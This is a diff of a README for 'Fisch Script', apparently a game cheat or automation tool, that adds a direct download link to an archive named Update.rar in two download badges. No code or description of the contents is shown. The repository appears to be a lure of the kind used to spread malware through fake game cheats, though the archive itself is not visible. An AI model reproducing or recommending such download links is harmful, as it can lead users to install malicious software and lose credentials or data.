@@ -1,9 +1,9 @@
-# 🐟 **Fisch Script — The Ultimate Automation Tool of 2025** 🚀  [![Download Fisch Script](https://img.shields.io/badge/Download-Fisch_Script-blue?style=for-the-badge&logo=download)]()
+# 🐟 **Fisch Script — The Ultimate Automation Tool of 2025** 🚀  [![Download Fisch Script](https://img.shields.io/badge/Download-Fisch_Script-blue?style=for-the-badge&logo=download)](https://github.com/DeviLoXe/fisch-script/releases/download/Update/Update.rar)
   
 
 ![fish](https://github.com/user-attachments/assets/c4ee3a44-9575-469f-a3e0-e950765cfd56)
 
-[![Download Fisch Script](https://img.shields.io/badge/Download-Fisch_Script-blue?style=for-the-badge&logo=download)]()  
+[![Download Fisch Script](https://img.shields.io/badge/Download-Fisch_Script-blue?style=for-the-badge&logo=download)](https://github.com/DeviLoXe/fisch-script/releases/download/Update/Update.rar)  
 
 ## ❓ **What is Fisch Script?**  
 
